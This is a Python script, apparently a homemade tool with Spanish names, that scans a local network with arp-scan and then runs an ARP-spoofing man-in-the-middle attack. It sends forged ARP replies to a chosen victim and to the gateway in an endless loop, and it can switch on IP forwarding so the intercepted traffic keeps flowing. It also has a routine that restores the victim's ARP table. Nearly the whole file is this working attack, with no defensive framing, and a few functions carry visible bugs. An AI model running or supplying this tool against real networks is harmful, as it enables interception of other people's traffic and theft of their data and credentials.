import subprocess
import requests
import scapy.all as scapy
import time
import argparse


def get_gateway():
    gateway = subprocess.Popen("route | grep default | awk '{print $2}'", shell=True, stdout=subprocess.PIPE).stdout
    gw = gateway.readline()

    return (gw.decode()).rstrip()


def escaneo():
    getHosts = subprocess.Popen("sudo arp-scan -l -x -q -r 6", shell=True, stdout=subprocess.PIPE).stdout
    Hosts = getHosts.readlines()

    for i in Hosts:
        st = i[:-1].decode().split()
        hosts.append(st[0])
        macs.append(st[1])


def quitarduplicados():
    auxhosts = list()
    auxmacs = list()

    for item in hosts:

        if item not in auxhosts:
            auxhosts.append(item)
            auxmacs.append(macs[hosts.index(item)])

    print(auxhosts)
    print(auxmacs)


def atacar(ipvictima, macvictima, macgateway):
    ipgateway = get_gateway()
    cont = 0

    while (1):
        packet = scapy.ARP(op=2, pdst=ipvictima, hwdst=macvictima, psrc=ipgateway)
        scapy.send(packet, count=2, verbose=False)
        packet = scapy.ARP(op=2, pdst=ipgateway, hwdst=macgateway, psrc=ipvictima)
        scapy.send(packet, count=2, verbose=False)
        # print(f"{cont}paquets enviados")
        cont = cont + 1
        time.sleep(2)


def forwading(opcion):
    if (forwading == 0):
        process = subprocess.Popen("echo 0 | sudo tee ip_forward", stdout=subprocess.PIPE)

    elif (forwading == 1):
        process = subprocess.Popen("echo 1 | sudo tee ip_forward", stdout=subprocess.PIPE)


def parar_ataque(ipvictima, macvictima, ipgateway, macgateway):
    ipgateway = get_gateway()

    packet = scapy.ARP(op=2, pdst=ipvictima, hwdst=macvictima, psrc=ipgateway, hwsrc=macgateway)
    scapy.send(packet, count=2, verbose=False)

    pass


hosts = list()
macs = list()


def main(args):
    if args.eleccion == 'gateway':
        print(get_gateway())

        pass
    elif args.eleccion == 'scan':

        escaneo()
        quitarduplicados()

    elif args.eleccion == 'parar':
        print("parando ataque")
        parar_ataque(ipvictima=args.ipvictima, macvictima=args.macvictima, macgateway=args.macgw)
    elif args.eleccion == 'atacar':
        # print("atacando")
        if args.forward == '1':
            forwading(1)
        atacar(ipvictima=args.ipvictima, macvictima=args.macvictima, macgateway=args.macgw)
    elif args.eleccion == 'sniff':
        print("atacando")
        atacar(ipvictima=args.ipvictima, macvictima=args.macvictima, macgateway=args.macgw)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--eleccion', type=str, default='1', help='umtiti')
    parser.add_argument('--ipvictima', type=str, default='1', help='umtiti')
    parser.add_argument('--macvictima', type=str, default='1', help='umtiti')
    parser.add_argument('--macgw', type=str, default='1', help='umtiti')
    parser.add_argument('--ipgw', type=str, default='1', help='umtiti')
    parser.add_argument('--sniff', type=str, default='1', help='umtiti')
    parser.add_argument('--monitor', type=str, default='1', help='umtiti')
    parser.add_argument('--forward', type=str, default='1', help='umtiti')

    args = parser.parse_args()
    main(args)








